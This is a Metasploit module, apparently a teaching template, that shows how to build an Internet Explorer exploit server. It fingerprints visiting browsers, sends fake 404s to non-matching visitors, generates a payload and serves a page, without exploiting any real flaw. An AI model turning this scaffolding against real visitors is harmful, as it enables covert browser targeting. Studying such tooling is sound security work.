##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "IE Exploit for BrowserExploitServer Proof-of-Concept",
      'Description'    => %q{
        Here's an example of building an exploit using the BrowserExploitServer.
        This example requires the target to be exploit. If not, the mixin will
        send a fake 404 as a way to avoid engaging the target. The example is
        for Windows only.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'http://metasploit.com' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00",  #Our spray doesn't like null bytes
          'StackAdjustment' => -3500
        },
      'Privileged'     => false,
      'DisclosureDate' => "Apr 1 2013",
      'DefaultTarget'  => 0))

    # You can see what you can see by doing this in on_request_exploit():
    # print_debug(target_info.inspect)
    # This example is for windows only
    requirements({
      :source  => /script|headers/i,
      :os_name => /win/i
    })
  end

  def exploit_template(target_info)
    tag = target_info.first[0]
    %Q|
    <% msg = "This page is generated by an exploit" %>
    <%=msg%>
    <p></p>
    You are tagged as: #{tag}<br>
    Data gathered from source: #{target_info[tag][:source]}<br>
    OS name: #{target_info[tag][:os_name]}<br>
    Flavor: #{target_info[tag][:os_flavor]}<br>
    UA name: #{target_info[tag][:ua_name]}<br>
    UA version: #{target_info[tag][:ua_ver]}
    |
  end

  def on_request_exploit(cli, request, target_info)
    p = get_payload(cli, target_info)
    vprint_line(Rex::Text.to_hex_dump(p))
    print_status("Sending exploit HTML...")
    send_exploit_html(cli, exploit_template(target_info))
  end


  def exploit
    super
  end

end

=begin

Example of raw target_info:

{"rMWwSAwBHLoESpHbEGbsv"=>{:source=>"script", :os_name=>"Microsoft Windows", :os_flavor=>"XP", :ua_name=>"MSIE", :ua_ver=>"8.0", :arch=>"x86", :office=>"null", :proxy=>false, :language=>"en-us", :tried=>true}}

=end